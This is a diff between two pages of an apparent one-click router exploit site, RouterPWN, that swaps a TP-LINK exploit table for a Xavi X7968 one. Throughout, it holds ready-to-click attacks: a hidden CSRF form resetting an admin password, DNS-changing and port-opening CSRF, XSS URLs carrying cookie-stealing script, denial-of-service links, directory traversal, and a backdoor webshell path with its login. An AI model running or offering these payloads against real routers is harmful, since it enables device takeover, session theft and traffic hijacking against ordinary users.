@@ -2,7 +2,7 @@
 <html>
  <head>
   <title>
-   RouterPWN - TP-LINK - One click exploits, News, Vulnerabilities, POC, Alerts
+   RouterPWN - Xavi - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
   <link href="includes/images/favicon.ico" rel="shortcut icon"/>
@@ -76,9 +76,9 @@
     </tr>
     <tr>
      <td>
-      <section id="tplink">
+      <section id="xavi">
        <h1>
-        TP-LINK
+        Xavi
        </h1>
        <table cellspacing="0" class="display" id="tabla" width="100%">
         <thead>
@@ -120,27 +120,23 @@
          </tr>
         </tfoot>
         <tbody>
-         <form action="http://192.168.1.1/Forms/tools_admin_1" id="WR1043ND" method="post" name="WR1043ND">
-          <input name="uiViewTools_Password" type="hidden" value="123123"/>
-          <input name="uiViewTools_PasswordConfirm" type="hidden" value="123123"/>
-         </form>
          <tr>
           <td>
-           01/14/14
+           01/02/12
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://1337day.com/exploit/21601">
-            1337day.com
+           <a href="javascript:alert('Busindre')">
+            [+]
            </a>
           </td>
           <td>
-           <a href="javascript:td8840t_resetauth()">
-            TD-8840T - Reset Password to Blank
+           <a href="http://192.168.1.1/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&amp;confirm=+Apply+">
+            X7968 cross site scripting
            </a>
-           <a href="javascript:td8840t_resetauth(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:setip('/webconfig/wan/confirm.html/confirm?context=pageAction%3Dadd%26pvcName%3D%2522%253e%253c%252ftd%253e%253cscript%253ealert%28document.cookie%29%253c%252fscript%253e%26vpi%3D0%26vci%3D38%26scat%3DUBR%26accessmode%3Dpppoe%26encap%3Dvcmux%26encapmode%3Dbridged%26iptype%3Ddhcp%26nat_enable%3Dfalse%26def_route_enable%3Dfalse%26qos_enable%3Dfalse%26chkPPPOEAC%3Dfalse%26tBoxPPPOEAC%3DNot%2520Configured%26sessiontype%3Dalways_on%26username%3Da%26password%3Dss&amp;confirm=+Apply+')">
             [SET IP]
            </a>
           </td>
@@ -150,21 +146,21 @@
          </tr>
          <tr>
           <td>
-           30/10/13
+           01/02/12
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.jakoblell.com/blog/2013/10/30/real-world-csrf-attack-hijacks-dns-server-configuration-of-tp-link-routers-2/">
-            www.jakoblell.com
+           <a href="javascript:alert('Busindre')">
+            [+]
            </a>
           </td>
           <td>
-           <a href="javascript:wr1043nd_dnscsrf()">
-            TP-Link WR1043ND - Change DNS CSRF
+           <a href="http://192.168.1.1/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&amp;sub_mask_txtbox=255.255.255.0&amp;host_name_txtbox=Hack%3CSCRIPT%3Ealert(document.cookie)%3C/script%3E&amp;domain_name_txtbox=local.lan&amp;mtu_txtbox=1500&amp;next=Apply">
+            X7968 persistent cross site scripting
            </a>
-           <a href="javascript:wr1043nd_dnscsrf(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:setip('/webconfig/lan/lan_config.html/local_lan_config?ip_add_txtbox=192.168.1.1&amp;sub_mask_txtbox=255.255.255.0&amp;host_name_txtbox=Hack%3CSCRIPT%3Ealert(document.cookie)%3C/script%3E&amp;domain_name_txtbox=local.lan&amp;mtu_txtbox=1500&amp;next=Apply')">
             [SET IP]
            </a>
           </td>
@@ -174,21 +170,21 @@
          </tr>
          <tr>
           <td>
-           08/06/13
+           01/02/12
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
-            securityevaluators.com
+           <a href="javascript:alert('Busindre')">
+            [+]
            </a>
           </td>
           <td>
-           <a href="javascript:document.WR1043ND.submit();">
-            WR1043ND denial of service
+           <a href="javascript:xavi()">
+            X7968 open port for ip CSRF
            </a>
-           <a href="javascript:setip('/...')">
+           <a href="javascript:xavir()">
             [SET IP]
            </a>
           </td>
@@ -198,93 +194,21 @@
          </tr>
          <tr>
           <td>
-           08/06/13
+           01/02/12
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
-            securityevaluators.com
+           <a href="javascript:alert('Busindre')">
+            [+]
            </a>
           </td>
           <td>
-           <a href="javascript:WR1043ND()">
-            WR1043ND enable root filsystem on FTP CSRF
+           <a href="http://192.168.1.1/webconfig/ports/ports.html">
+            X7968 denial of service
            </a>
-           <a href="javascript:WR1043ND(ip)" onclick="return ip=prompt('IP:');">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           04/06/13
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://www.youtube.com/watch?v=8xJGkRQB0QM">
-            www.youtube.com
-           </a>
-          </td>
-          <td>
-           <a href="http://192.168.1.1/Forms/tools_admin_1">
-            TD-8817 TD-W8901G blank admin password CSRF
-           </a>
-           <a href="javascript:setip('/Forms/tools_admin_1');">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           05/26/12
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://www.websec.mx/advisories/view/tplink-wdr740-path-traversal">
-            www.websec.mx
-           </a>
-          </td>
-          <td>
-           <a href="javascript:wdr740_dirtraversal()">
-            TP-Link WDR740ND/WDR740N - Directory Traversal
-           </a>
-           <a href="javascript:wdr740_dirtraversal(ip)" onclick="return ip=prompt('IP:');">
-            [SET IP]
-           </a>
-          </td>
-          <td>
-           Author
-          </td>
-         </tr>
-         <tr>
-          <td>
-           05/26/12
-          </td>
-          <td>
-           One click
-          </td>
-          <td>
-           <a href="http://www.websec.mx/advisories/view/puerta-trasera-tplink-wdr740">
-            www.websec.mx
-           </a>
-          </td>
-          <td>
-           <a href="http://192.168.0.1/userRpmNatDebugRpm26525557/linux_cmdline.html">
-            Webshell backdoor (user: osteam password: 5up)
-           </a>
-           <a href="javascript:setip('/userRpmNatDebugRpm26525557/linux_cmdline.html');">
+           <a href="javascript:setip('/webconfig/ports/ports.html')">
             [SET IP]
            </a>
           </td>
